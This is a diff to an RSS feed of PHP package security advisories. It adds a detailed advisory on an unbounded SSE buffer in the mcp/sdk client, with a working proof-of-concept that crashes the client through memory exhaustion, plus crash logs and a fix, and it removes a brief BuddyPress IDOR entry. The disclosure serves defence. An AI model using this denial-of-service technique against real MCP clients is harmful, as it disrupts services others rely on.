@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://xlordz.github.io/github-advisory-database-rss/composer.rss</id>
     <title>Security Advisory for PHP packages hosted at packagist.org</title>
-    <updated>2026-08-19T18:56:29.366Z</updated>
+    <updated>2026-08-19T19:21:59.324Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Acomposer"/>
     <subtitle>Security Advisory for PHP packages hosted at packagist.org on GitHub</subtitle>
@@ -11,6 +11,303 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[mcp/sdk] MCP PHP SDK: client HttpTransport SSE buffer (sseBuffer .= chunk) grows unbounded when server withholds the event delimiter]]></title>
+        <id>https://github.com/advisories/GHSA-7m52-jw36-44r3</id>
+        <link href="https://github.com/advisories/GHSA-7m52-jw36-44r3"/>
+        <updated>2026-08-19T19:17:50.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>The HTTP client transport in <code>mcp/sdk</code> reads a Server-Sent-Events (SSE) response
+stream incrementally and appends each 4 KiB chunk to an in-memory buffer
+(<code>$this-&gt;sseBuffer .= $chunk;</code>) with <strong>no upper bound</strong>. The buffer is only ever
+flushed when an SSE event delimiter (<code>"\n\n"</code>) appears. A remote MCP server (the
+peer the client connects to) that streams response bytes without ever sending the
+<code>"\n\n"</code> delimiter makes <code>$sseBuffer</code> grow without limit until the client process
+exhausts its PHP <code>memory_limit</code> (fatal "Allowed memory size … exhausted") or is
+killed by the OS OOM-killer.</p>
+<p>This is a denial-of-service against the MCP <strong>client</strong>: any server it talks to —
+or a network position that controls the server's response body — can crash the
+client by withholding the event delimiter while streaming data.</p>
+<h2 id="impact">Impact</h2>
+<ul>
+<li><strong>Type:</strong> Denial of service (memory exhaustion / process crash) of the MCP client.</li>
+<li><strong>Who can trigger it:</strong> The remote MCP server endpoint the client connects to via
+<code>HttpTransport</code>, or any party that can control/inject into that server's SSE
+response body (e.g. a man-in-the-middle on a plaintext endpoint, or a malicious
+or compromised server). The buffer growth happens while the transport is reading
+the response stream, before a complete event is ever parsed.</li>
+<li><strong>Effect:</strong> A response stream of N bytes containing no <code>"\n\n"</code> drives the client's
+resident buffer to track N. A few hundred MB of delimiter-free data is enough to
+kill a client running with a typical <code>memory_limit</code>.</li>
+<li><strong>Severity (suggested, maintainer to confirm):</strong> High — a remote server can
+reliably crash a connected client over the HTTP/SSE transport.</li>
+</ul>
+<h2 id="how-input-reaches-the-sink-reachability">How input reaches the sink (reachability)</h2>
+<ol>
+<li>A client connects to a server over the HTTP transport by constructing
+<code>Mcp\Client\Transport\HttpTransport</code> with the server endpoint URL, then runs
+the connect/request loop.</li>
+<li>The transport's loop calls <code>tick()</code> (line 182), which calls
+<code>processSSEStream()</code> (line 194) on each iteration.</li>
+<li><code>processSSEStream()</code> reads up to 4096 bytes from the active SSE stream and
+appends them to <code>$this-&gt;sseBuffer</code> (line 203).</li>
+<li>The buffer is only drained inside the <code>while (false !== ($pos = strpos($this-&gt;sseBuffer, "\n\n")))</code>
+loop (line 207). If the server never emits <code>"\n\n"</code>, the <code>strpos</code> never matches,
+the buffer is never flushed, and it grows on every <code>tick()</code> until OOM.</li>
+</ol>
+<h2 id="vulnerable-code">Vulnerable code</h2>
+<p><code>src/Client/Transport/HttpTransport.php</code> (v0.5.0):</p>
+<pre><code class="language-php">    private string $sseBuffer = '';
+</code></pre>
+<pre><code class="language-php">    private function processSSEStream(): void
+    {
+        if (null === $this-&gt;activeStream) {
+            return;
+        }
+
+        if (!$this-&gt;activeStream-&gt;eof()) {
+            $chunk = $this-&gt;activeStream-&gt;read(4096);
+            if ('' !== $chunk) {
+                $this-&gt;sseBuffer .= $chunk;          // line 203 — unbounded append
+            }
+        }
+
+        while (false !== ($pos = strpos($this-&gt;sseBuffer, "\n\n"))) {
+            $event = substr($this-&gt;sseBuffer, 0, $pos);
+            $this-&gt;sseBuffer = substr($this-&gt;sseBuffer, $pos + 2);
+
+            if (!empty(trim($event))) {
+                $this-&gt;processSSEEvent($event);
+            }
+        }
+
+        if ($this-&gt;activeStream-&gt;eof() &amp;&amp; empty($this-&gt;sseBuffer)) {
+            $this-&gt;activeStream = null;
+        }
+    }
+</code></pre>
+<p><code>$this-&gt;sseBuffer .= $chunk;</code> has no length guard; the drain loop only fires when a
+<code>"\n\n"</code> delimiter is present.</p>
+<h2 id="proof-of-concept--end-to-end-reproduction-against-the-released-composer-package">Proof of concept / End-to-end reproduction (against the released composer package)</h2>
+<p>Environment: macOS arm64, PHP 8.5.6 (cli), Composer 2.9.8. The package under test
+is the real published release <code>mcp/sdk v0.5.0</code> (the version that introduced this
+HTTP client transport), installed from Packagist — not a re-implementation of the
+sink.</p>
+<p>Install the released package:</p>
+<pre><code>$ composer require mcp/sdk:0.5.0 --no-interaction
+  - Installing mcp/sdk (v0.5.0): Extracting archive
+$ composer show mcp/sdk
+name     : mcp/sdk
+versions : * v0.5.0
+</code></pre>
+<p>PoC driver (<code>poc_sse.php</code>). It exercises the <strong>unmodified</strong> released
+<code>processSSEStream()</code>; the <code>ProbeHttp</code> subclass uses reflection only to inject the
+active SSE stream and to invoke the inherited private method — no transport logic
+is overridden. <code>FloodStream</code> is a real PSR-7 <code>StreamInterface</code> that yields a large
+body (4096 bytes per <code>read()</code>) that never contains <code>"\n\n"</code>, mirroring an
+adversarial SSE server response. The null PSR-18/17 stubs only satisfy the
+constructor; the sink reads exclusively from the injected stream and never touches
+the HTTP client:</p>
+<pre><code class="language-php">&lt;?php
+require __DIR__ . '/vendor/autoload.php';
+use Mcp\Client\Transport\HttpTransport;
+use Psr\Http\Message\StreamInterface;
+use Psr\Http\Client\ClientInterface;
+use Psr\Http\Message\RequestFactoryInterface;
+use Psr\Http\Message\StreamFactoryInterface;
+use Psr\Http\Message\RequestInterface;
+use Psr\Http\Message\ResponseInterface;
+
+final class FloodStream implements StreamInterface {
+    private int $served = 0;
+    public function __construct(private int $total) {}
+    public function read(int $length): string {
+        if ($this-&gt;served &gt;= $this-&gt;total) return '';
+        $n = min($length, $this-&gt;total - $this-&gt;served);
+        $this-&gt;served += $n;
+        return str_repeat('A', $n);           // never contains "\n\n"
+    }
+    public function eof(): bool { return $this-&gt;served &gt;= $this-&gt;total; }
+    public function __toString(): string { return ''; }
+    public function close(): void {}
+    public function detach() { return null; }
+    public function getSize(): ?int { return $this-&gt;total; }
+    public function tell(): int { return $this-&gt;served; }
+    public function isSeekable(): bool { return false; }
+    public function seek(int $o, int $w = SEEK_SET): void {}
+    public function rewind(): void {}
+    public function isWritable(): bool { return false; }
+    public function write(string $s): int { return 0; }
+    public function isReadable(): bool { return true; }
+    public function getContents(): string { return ''; }
+    public function getMetadata(?string $key = null) { return null; }
+}
+final class NullHttpClient implements ClientInterface {
+    public function sendRequest(RequestInterface $request): ResponseInterface { throw new \RuntimeException('not used'); }
+}
+final class NullRequestFactory implements RequestFactoryInterface {
+    public function createRequest(string $method, $uri): RequestInterface { throw new \RuntimeException('not used'); }
+}
+final class NullStreamFactory implements StreamFactoryInterface {
+    public function createStream(string $content = ''): StreamInterface { throw new \RuntimeException('not used'); }
+    public function createStreamFromFile(string $filename, string $mode = 'r'): StreamInterface { throw new \RuntimeException('not used'); }
+    public function createStreamFromResource($resource): StreamInterface { throw new \RuntimeException('not used'); }
+}
+final class ProbeHttp extends HttpTransport {
+    public function inject(StreamInterface $s): void {
+        (new ReflectionProperty(HttpTransport::class, 'activeStream'))-&gt;setValue($this, $s);
+    }
+    public function pump(): void {
+        (new ReflectionMethod(HttpTransport::class, 'processSSEStream'))-&gt;invoke($this);
+    }
+}
+function fmtMB(int $b): string { return number_format($b/1048576,1).' MB'; }
+$mode = $argv[1] ?? 'attack';
+$t = new ProbeHttp('http://127.0.0.1:9/mcp', [], new NullHttpClient(), new NullRequestFactory(), new NullStreamFactory());
+
+if ($mode === 'control') {
+    $body = '';
+    for ($i=0;$i&lt;1000;$i++) $body .= "event: message\ndata: {\"jsonrpc\":\"2.0\",\"id\":$i}\n\n";
+    $tmp = fopen('php://temp','r+'); fwrite($tmp,$body); rewind($tmp);
+    $t-&gt;inject(new FloodStream(0));   // replaced below by a real stream over $tmp
+    $stream = new class($tmp) implements StreamInterface {
+        public function __construct(private $h) {}
+        public function read(int $l): string { return (string) fread($this-&gt;h, $l); }
+        public function eof(): bool { return feof($this-&gt;h); }
+        public function __toString(): string { return ''; }
+        public function close(): void {}
+        public function detach() { return null; }
+        public function getSize(): ?int { return null; }
+        public function tell(): int { return 0; }
+        public function isSeekable(): bool { return false; }
+        public function seek(int $o,int $w=SEEK_SET): void {}
+        public function rewind(): void {}
+        public function isWritable(): bool { return false; }
+        public function write(string $s): int { return 0; }
+        public function isReadable(): bool { return true; }
+        public function getContents(): string { return ''; }
+        public function getMetadata(?string $k=null) { return null; }
+    };
+    $t-&gt;inject($stream);
+    $before = memory_get_usage(true);
+    for ($i=0;$i&lt;5000 &amp;&amp; !$stream-&gt;eof();$i++) $t-&gt;pump();
+    fwrite(STDERR,"[control] events fed   : 1000 well-formed SSE events (delimited by \\n\\n)\n");
+    fwrite(STDERR,"[control] mem before   : ".fmtMB($before)."\n");
+    fwrite(STDERR,"[control] mem after    : ".fmtMB(memory_get_usage(true))."\n");
+    fwrite(STDERR,"[control] RESULT       : bounded, no OOM (each event flushed on \\n\\n)\n");
+    exit(0);
+}
+
+ini_set('memory_limit','256M');
+$SIZE = 400*1024*1024;                              // 400MB SSE body, NO "\n\n"
+$t-&gt;inject(new FloodStream($SIZE));
+fwrite(STDERR,"[attack] SSE body         : ".fmtMB($SIZE)." with NO \\n\\n delimiter\n");
+fwrite(STDERR,"[attack] memory_limit     : ".ini_get('memory_limit')."\n");
+fwrite(STDERR,"[attack] mem before       : ".fmtMB(memory_get_usage(true))."\n");
+register_shutdown_function(function() {
+    $err = error_get_last();
+    fwrite(STDERR,"[attack] peak mem         : ".number_format(memory_get_peak_usage(true)/1048576,1)." MB\n");
+    if ($err &amp;&amp; stripos($err['message'],'memory')!==false)
+        fwrite(STDERR,"[attack] RESULT           : OOM — ".trim($err['message'])."\n");
+});
+for ($i=0;;$i++) { $t-&gt;pump(); }      // each pump reads one 4096 chunk -&gt; sseBuffer
+</code></pre>
+<p>Negative control — 1000 well-formed SSE events delimited by <code>"\n\n"</code>: each pump
+flushes complete events, the buffer drains, memory stays flat:</p>
+<pre><code>$ php poc_sse.php control
+[control] events fed   : 1000 well-formed SSE events (delimited by \n\n)
+[control] mem before   : 2.0 MB
+[control] mem after    : 2.0 MB
+[control] RESULT       : bounded, no OOM (each event flushed on \n\n)
+</code></pre>
+<p>Attack — a 400 MB SSE body with no <code>"\n\n"</code>, client heap capped at 256 MB to make
+the crash deterministic (a production client has a larger or unbounded limit and
+is killed by the OS at whatever ceiling exists):</p>
+<pre><code>$ php poc_sse.php attack
+[attack] SSE body         : 400.0 MB with NO \n\n delimiter
+[attack] memory_limit     : 256M
+[attack] mem before       : 2.0 MB
+PHP Fatal error:  Allowed memory size of 268435456 bytes exhausted (tried to allocate 264241184 bytes) in /private/tmp/work/vendor/mcp/sdk/src/Client/Transport/HttpTransport.php on line 203
+Stack trace:
+#0 [internal function]: Mcp\Client\Transport\HttpTransport-&gt;processSSEStream()
+#1 /private/tmp/work/poc_sse.php(69): ReflectionMethod-&gt;invoke(Object(ProbeHttp))
+#2 /private/tmp/work/poc_sse.php(129): ProbeHttp-&gt;pump()
+#3 {main}
+[attack] peak mem         : 256.0 MB
+[attack] RESULT           : OOM — Allowed memory size of 268435456 bytes exhausted (tried to allocate 264241184 bytes)
+</code></pre>
+<p>The fatal error lands on the released vendor file
+<code>vendor/mcp/sdk/src/Client/Transport/HttpTransport.php</code> line 203, inside
+<code>processSSEStream()</code>, while the delimiter-respecting control workload stays at
+2.0 MB. This confirms the unbounded SSE accumulation on the real released package.</p>
+<h2 id="suggested-fix">Suggested fix</h2>
+<p>Bound the SSE buffer length and reject (or abort the stream) when it exceeds a
+configured maximum, so a server cannot force unbounded growth before a complete
+event arrives. For example:</p>
+<pre><code class="language-php">private const MAX_SSE_BUFFER_BYTES = 8 * 1024 * 1024; // 8 MiB, configurable
+
+private function processSSEStream(): void
+{
+    if (null === $this-&gt;activeStream) {
+        return;
+    }
+
+    if (!$this-&gt;activeStream-&gt;eof()) {
+        $chunk = $this-&gt;activeStream-&gt;read(4096);
+        if ('' !== $chunk) {
+            if (\strlen($this-&gt;sseBuffer) + \strlen($chunk) &gt; self::MAX_SSE_BUFFER_BYTES) {
+                $this-&gt;sseBuffer = '';
+                $this-&gt;activeStream = null;
+                $this-&gt;logger-&gt;warning('Aborting SSE stream: buffer exceeded maximum size without a complete event.', [
+                    'max_sse_buffer_bytes' =&gt; self::MAX_SSE_BUFFER_BYTES,
+                ]);
+
+                return;
+            }
+            $this-&gt;sseBuffer .= $chunk;
+        }
+    }
+
+    while (false !== ($pos = strpos($this-&gt;sseBuffer, "\n\n"))) {
+        $event = substr($this-&gt;sseBuffer, 0, $pos);
+        $this-&gt;sseBuffer = substr($this-&gt;sseBuffer, $pos + 2);
+
+        if (!empty(trim($event))) {
+            $this-&gt;processSSEEvent($event);
+        }
+    }
+
+    if ($this-&gt;activeStream-&gt;eof() &amp;&amp; empty($this-&gt;sseBuffer)) {
+        $this-&gt;activeStream = null;
+    }
+}
+</code></pre>
+<p>The cap value and the over-limit policy (abort vs. error) are the maintainers'
+call. A fix PR against a private fork of the advisory workspace accompanies this
+report.</p>
+<h2 id="fix-pr">Fix PR</h2>
+<p>A patch bounding the SSE buffer is provided as a pull request against the private
+temporary fork created for this advisory (the GHSA workspace fork). Details and
+link are added to this advisory's thread once the private fork PR is opened. The
+patch keeps the SSE event-parsing behaviour unchanged and only caps the buffer.</p>
+<h2 id="credit">Credit</h2>
+<p>Reported by tonghuaroot.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/modelcontextprotocol/php-sdk/security/advisories/GHSA-7m52-jw36-44r3">https://github.com/modelcontextprotocol/php-sdk/security/advisories/GHSA-7m52-jw36-44r3</a></li>
+<li><a href="https://github.com/FriendsOfPHP/security-advisories/blob/master/mcp/sdk/CVE-2026-53965.yaml">https://github.com/FriendsOfPHP/security-advisories/blob/master/mcp/sdk/CVE-2026-53965.yaml</a></li>
+<li><a href="https://github.com/modelcontextprotocol/php-sdk/releases/tag/v0.7.1">https://github.com/modelcontextprotocol/php-sdk/releases/tag/v0.7.1</a></li>
+<li><a href="https://github.com/advisories/GHSA-7m52-jw36-44r3">https://github.com/advisories/GHSA-7m52-jw36-44r3</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-7m52-jw36-44r3</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-08-19T19:17:49.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[librenms/librenms] LibreNMS: SSRF-driven stored XSS via Oxidized API response fields in device showconfig page]]></title>
         <id>https://github.com/advisories/GHSA-7gww-x7fh-jf9j</id>
@@ -1850,28 +2147,5 @@ if (!preg_match('/^[a-zA-Z0-9]([a-zA-Z0-9_]+)?$/', $this-&gt;getId())) {
         </author>
         <category label="severity" term="HIGH"/>
         <published>2026-06-10T09:31:57.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[buddypress/buddypress] BuddyPress: Any authenticated attacker can enumerate another user's complete friend list via IDOR]]></title>
-        <id>https://github.com/advisories/GHSA-wmjr-58rf-xgrc</id>
-        <link href="https://github.com/advisories/GHSA-wmjr-58rf-xgrc"/>
-        <updated>2026-08-12T19:13:35.000Z</updated>
-        <content type="html"><![CDATA[<p>BuddyPress 14.4.0 contains an insecure direct object reference vulnerability in the friends REST API that allows any authenticated attacker to enumerate another user's complete friend list. Attackers can query the friends endpoint with an arbitrary user_id because the get_items_permissions_check method only verifies that the requester is logged in and never checks ownership of the requested list, resulting in disclosure of users' private social connections.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-53675">https://nvd.nist.gov/vuln/detail/CVE-2026-53675</a></li>
-<li><a href="https://buddypress.org">https://buddypress.org</a></li>
-<li><a href="https://wordpress.org/plugins/buddypress">https://wordpress.org/plugins/buddypress</a></li>
-<li><a href="https://www.vulncheck.com/advisories/buddypress-friends-list-idor-via-rest-api">https://www.vulncheck.com/advisories/buddypress-friends-list-idor-via-rest-api</a></li>
-<li><a href="https://github.com/advisories/GHSA-wmjr-58rf-xgrc">https://github.com/advisories/GHSA-wmjr-58rf-xgrc</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-wmjr-58rf-xgrc</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-06-10T00:31:53.000Z</published>
     </entry>
 </feed>
